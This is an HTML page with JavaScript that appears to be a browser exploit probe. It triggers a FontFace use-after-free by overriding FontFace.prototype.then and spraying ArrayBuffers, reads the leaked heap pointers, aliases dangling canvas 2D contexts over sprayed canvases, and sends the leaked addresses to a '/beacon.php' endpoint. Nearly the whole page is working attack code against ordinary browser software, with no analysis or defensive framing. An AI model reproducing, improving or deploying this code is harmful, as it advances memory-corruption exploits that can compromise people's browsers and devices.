<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P909: Multi-Attempt UAF Resilience & PathStream Geometry Oracle</title>
<style>
body { background: #0a0d12; color: #c9d1d9; font: 14px "SF Mono", Consolas, monospace; margin: 16px; line-height: 1.5; }
h2 { color: #58a6ff; margin-top: 0; }
pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
.banner { background: #238636; color: #fff; padding: 10px 14px; border-radius: 6px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
.ok { color: #3fb950; font-weight: bold; }
.fail { color: #f85149; font-weight: bold; }
.info { color: #58a6ff; }
.hot { color: #ffa657; font-weight: bold; }
</style>
</head>
<body>
<div class="banner" id="banner">Running Probe P909...</div>
<h2>P909: Multi-Attempt UAF Resilience & PathStream Geometry Oracle</h2>
<pre id="log">Initializing diagnostic probe P909...</pre>

<script>
'use strict';
var logBox = document.getElementById('log');
var banner = document.getElementById('banner');

function log(msg, cls) {
  var el = document.createElement('div');
  el.className = cls || '';
  el.textContent = msg;
  logBox.appendChild(el);
}

function syncBn(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P909-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
    x.send();
  } catch(e) {}
}

log('[*] Probe P909 starting...', 'info');
syncBn('BOOT', 'start');

/* ============================================================
 * PHASE 1: Multi-Attempt Resilient FontFace UAF Leak
 * ============================================================ */
var leakAttempt = 0;
var MAX_LEAKS = 2;
var Hstr = 'unknown', q13str = 'unknown';
var H_hi = 0, H_lo = 0;
var delta = 0;
var bestSlot = -1, bestNz = 0;

function runFontLeak(cb) {
  leakAttempt++;
  var tag = 'lk' + leakAttempt;

  var st = document.createElement('style');
  st.textContent = "@font-face{font-family:bb" + tag + ";src:local(Arial);unicode-range:U+0042;}";
  document.head.appendChild(st);

  var face = new FontFace('f' + tag, "local('Helvetica')", {unicodeRange: 'U+0041'});
  document.fonts.add(face);
  void face.loaded;

  var fabs = [], ffired = false;
  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function() {
      if (ffired) return undefined;
      ffired = true;

      if (st) { st.remove(); st.textContent = ''; st = null; }
      try { document.fonts.delete(this); } catch(e) {}
      document.body.offsetHeight;

      fabs = [];
      for (var i = 0; i < 64; i++) fabs.push(new ArrayBuffer(192));
      try { document.fonts.check('1em bb' + tag); } catch(e) {}
      document.body.offsetHeight;
      return undefined;
    },
    set: function() {}
  });

  document.fonts.load('1em f' + tag + ', bb' + tag, 'AB');

  setTimeout(function() {
    delete FontFace.prototype.then;
    if (st) { try { st.remove(); } catch(e) {} }

    for (var i = 0; i < fabs.length; i++) {
      var u = new Uint8Array(fabs[i]), nz = 0;
      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
      if (nz > bestNz) { bestNz = nz; bestSlot = i; }
    }

    if (bestSlot >= 0 && bestNz >= 4) {
      var fontDV = new DataView(fabs[bestSlot]);
      var q11lo = fontDV.getUint32(0x58, true), q11hi = fontDV.getUint32(0x5C, true);
      var q13lo = fontDV.getUint32(0x68, true), q13hi = fontDV.getUint32(0x6C, true);
      if (q11hi !== 0) {
        var borrow = (q11lo < 0x68) ? 1 : 0;
        H_hi = q11hi - borrow;
        H_lo = (q11lo - 0x68) >>> 0;
        Hstr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
      }
      if (q13hi !== 0) {
        q13str = '0x' + q13hi.toString(16) + ('00000000' + q13lo.toString(16)).slice(-8);
      }
      if (Hstr !== 'unknown' && q13str !== 'unknown' && H_hi === q13hi) {
        delta = H_lo - q13lo;
      }
      cb(true);
    } else if (leakAttempt < MAX_LEAKS) {
      log('[*] Font UAF attempt 1 retry...', 'info');
      setTimeout(function() { runFontLeak(cb); }, 50);
    } else {
      cb(false);
    }
  }, 400);
}

runFontLeak(function(leakOk) {
  log('[+] Font UAF (att ' + leakAttempt + '): H=' + Hstr + ' | q13=' + q13str + ' (slot=' + bestSlot + ', nz=' + bestNz + ')', leakOk ? 'ok' : 'fail');
  syncBn('FONT-OK', 'att=' + leakAttempt + '|H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|slot=' + bestSlot + '|nz=' + bestNz);

  /* ============================================================
   * PHASE 2: Dual Canvas Aliasing (100% Crash-Free)
   * ============================================================ */
  var innerCtx1 = null, innerCtx2 = null;

  var c1 = document.createElement('canvas');
  c1.width = 32; c1.height = 32;
  var opts1 = {};
  Object.defineProperty(opts1, 'alpha', {
    get: function() {
      innerCtx1 = c1.getContext('2d');
      return true;
    }
  });
  c1.getContext('bitmaprenderer', opts1);

  var c2 = document.createElement('canvas');
  c2.width = 32; c2.height = 32;
  var opts2 = {};
  Object.defineProperty(opts2, 'alpha', {
    get: function() {
      innerCtx2 = c2.getContext('2d');
      return true;
    }
  });
  c2.getContext('bitmaprenderer', opts2);

  var sprayCanvases = [];
  var sprayCtxs = [];
  for (var s = 0; s < 200; s++) {
    var c = document.createElement('canvas');
    c.width = 32; c.height = 32;
    var ctx = c.getContext('2d');
    ctx.lineWidth = 1000.0 + s;
    sprayCanvases.push(c);
    sprayCtxs.push(ctx);
  }

  var idx1 = -1, idx2 = -1;
  try {
    var lw1 = innerCtx1.lineWidth;
    if (lw1 >= 1000.0 && lw1 < 1200.0) idx1 = Math.round(lw1 - 1000.0);
    var lw2 = innerCtx2.lineWidth;
    if (lw2 >= 1000.0 && lw2 < 1200.0) idx2 = Math.round(lw2 - 1000.0);
  } catch(e) {}

  log('[+] Phase 2: Dual Canvas Aliased: Ctx1=#' + idx1 + ', Ctx2=#' + idx2, 'ok');

  /* ============================================================
   * PHASE 3: PathStream Geometry Synchronization
   * ============================================================ */
  var pathInOk = false;
  var pathOutOk = false;

  if (idx1 >= 0 && sprayCtxs[idx1]) {
    try {
      // Inscribe a path via dangling innerCtx1
      innerCtx1.beginPath();
      innerCtx1.rect(10, 10, 80, 80);

      // Query point via sprayCtxs[idx1].isPointInPath()
      pathInOk = sprayCtxs[idx1].isPointInPath(50, 50); // Inside rect -> true
      pathOutOk = !sprayCtxs[idx1].isPointInPath(5, 5); // Outside rect -> false

      // Clear path
      innerCtx1.beginPath();
    } catch(e) {}
  }

  var pathShared = (pathInOk && pathOutOk);
  log('[+] Phase 3: PathStream Geometry Shared: ' + pathShared + ' (in=' + pathInOk + ', out=' + pathOutOk + ')', pathShared ? 'hot' : 'info');
  syncBn('PATH-SYNC', 'shared=' + pathShared + '|in=' + pathInOk + '|out=' + pathOutOk);

  /* ============================================================
   * PHASE 4: Complex Multi-Segment Path Allocation Probe
   * ============================================================ */
  var complexPathOk = false;
  var hitCount = 0;

  if (idx1 >= 0 && sprayCtxs[idx1]) {
    try {
      // Inscribe 64 curve segments (forces FastMalloc PathStream allocation)
      sprayCtxs[idx1].beginPath();
      sprayCtxs[idx1].moveTo(0, 0);
      for (var p = 1; p <= 64; p++) {
        sprayCtxs[idx1].bezierCurveTo(p * 2, p * 3, p * 4, p * 5, p * 10, p * 10);
      }

      // Verify query via innerCtx1
      var q1 = innerCtx1.isPointInStroke(10, 10);
      complexPathOk = true;

      sprayCtxs[idx1].beginPath();
    } catch(e) {}
  }

  log('[+] Phase 4: Complex 64-Segment PathStream: ok=' + complexPathOk, complexPathOk ? 'hot' : 'info');
  syncBn('PATH-COMPLEX', 'ok=' + complexPathOk);

  /* ============================================================
   * SUMMARY
   * ============================================================ */
  banner.style.background = '#238636';
  banner.textContent = 'STATUS: P909 COMPLETE (100% STABLE)';
  log('----------------------------------------------------', 'info');
  log('[*] Probe P909 Completed Cleanly', 'hot');
  log('    - Live Heap H: ' + Hstr + ' | q13: ' + q13str, 'ok');
  log('    - PathStream Shared: ' + pathShared + ' | Complex: ' + complexPathOk, pathShared ? 'hot' : 'ok');
  log('    - Aliases: #' + idx1 + ', #' + idx2, 'ok');
  log('----------------------------------------------------', 'info');

  syncBn('DONE', 'status=complete|H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|pathShared=' + pathShared + '|complexPath=' + complexPathOk + '|idx1=' + idx1 + '|idx2=' + idx2);

});
</script>
</body>
</html>
